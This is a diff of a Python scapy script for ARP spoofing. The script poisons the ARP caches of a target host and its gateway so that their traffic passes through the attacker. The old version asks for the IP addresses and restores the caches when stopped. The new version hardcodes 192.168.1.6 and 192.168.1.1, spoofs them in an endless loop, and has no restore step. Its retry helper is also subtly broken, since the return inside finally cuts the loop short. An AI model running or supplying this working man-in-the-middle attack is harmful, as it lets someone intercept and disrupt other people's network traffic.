@@ -1,41 +1,44 @@
+from scapy.all import srp,send,ARP
 import scapy.all as scapy
 import time
 
-def mac(ipadd):
-    arp_request = scapy.ARP(pdst=ipadd)
-    br = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_req_br = br / arp_request
-    list_1 = scapy.srp(arp_req_br, timeout=5, verbose=False)[0]
-    return list_1[0][1].hwsrc
+# def get_mac(ip):
+#     arp_request = scapy.ARP(pdst=ip)
+#     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+#     arp_request_broadcast = broadcast/arp_request
+#     answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
 
+#     # print(answered_list[0][1].hwsrc)
+#     return (answered_list[0][1].hwsrc)
 
-def spoof(targ, spoof):
-    packet = scapy.ARP(op=2, pdst=targ, hwdst=mac(targ),
-                       psrc=spoof)
-    scapy.send(packet, verbose=False)
+    # client_list = [0]
+    # for element in answered_list:
+    #     client_dict = {"ip":element[1].psrc,"mac":element[1].hwsrc}
+    #     client_list.append(client_dict)
+    # return client_list
+def get_mac(ip):
+    mac = "xx"
+    while mac == "xx":
+        try:
+            arp_request = scapy.ARP(pdst=ip)
+            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+            arp_request_broadcast = broadcast/arp_request
+            answered_list = scapy.srp(arp_request_broadcast, timeout=1 , verbose=False)[0]
+            mac = answered_list[0][1].hwsrc
+            # print(mac)
+        except:
+            pass
+        finally:
+            return mac
 
+def spoof(target_ip,spoof_ip):    
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
+    # print(packet.show())
+    # print(packet.summary())
+    scapy.send(packet)
 
-def reset(dest_ip, src_ip):
-    dest_mac = mac(dest_ip)
-    source_mac = mac(src_ip)
-    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=source_mac)
-    scapy.send(packet, verbose=False)
-
-
-target_ip = input("[*] Enter Target IP > ")  # Enter your target IP
-gateway_ip = input("[*] Enter Gateway IP > ")  # Enter your gateway's IP
-
-try:
-    countpackets = 0
-    while True:
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
-        countpackets = countpackets + 2
-        print("\r[*] Packets Sent " + str(countpackets), end="")
-        time.sleep(2)  # Waits for two seconds
-
-except KeyboardInterrupt:
-    print("\nCtrl + C pressed............. Quitting. ")
-    reset(gateway_ip, target_ip)
-    reset(target_ip, gateway_ip)
-    print("[*] Arp Spoof Stopped, IP restored. ")
+while True:
+    spoof("192.168.1.6","192.168.1.1")
+    spoof("192.168.1.1","192.168.1.6")
+    time.sleep(2)
